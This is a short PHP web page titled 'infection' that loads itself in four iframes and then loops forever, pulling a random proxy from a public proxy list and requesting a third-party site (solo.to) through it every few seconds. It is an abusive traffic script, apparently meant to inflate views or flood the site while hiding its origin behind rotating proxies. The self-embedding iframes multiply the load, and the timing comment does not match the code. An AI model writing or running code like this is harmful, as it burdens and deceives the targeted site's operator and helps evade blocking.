<html>
  <head>
    <title>🍾🍾🍾🍾 infection 🍾🍾🍾🍾</title>
  </head>
  <body>
    <?php echo '<p>INFECTION</p>'; ?> 
<?php
$websiteUrl = "index.php"; // Replace with the URL of the website you want to display

?>

<!DOCTYPE html>
<html>
<head>

</head>
<body>
    <iframe src="<?php echo $websiteUrl; ?>" width="100%" height="600"></iframe>
      <iframe src="<?php echo $websiteUrl; ?>" width="100%" height="600"></iframe>
      <iframe src="<?php echo $websiteUrl; ?>" width="100%" height="600"></iframe>
      <iframe src="<?php echo $websiteUrl; ?>" width="100%" height="600"></iframe>
  
</body>
</html>

<?php

function getRandomProxy($proxyListUrl) {
    $proxyList = file_get_contents($proxyListUrl);
    $proxies = explode("\n", $proxyList);
    $randomProxy = $proxies[array_rand($proxies)];
    return trim($randomProxy);
}

$websiteUrl2 = "http://www.solo.to/";
$proxyListUrl = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"; // Replace with the actual URL of the proxy list

while (true) {
    $proxy = getRandomProxy($proxyListUrl);

    $options = array(
        'http' => array(
            'proxy' => $proxy,
            'request_fulluri' => true,
        ),
        'ssl' => array(
            'proxy' => $proxy,
            'request_fulluri' => true,
        ),
    );

    $context = stream_context_create($options);

    // Open the website URL using the proxy
    $response = file_get_contents($websiteUrl2, false, $context);

    // Do something with the response if needed

    sleep(3.351); // Wait for 2.65 seconds before refreshing

    // You can add additional logic to exit the loop after a certain number of refreshes or at a specific time
}


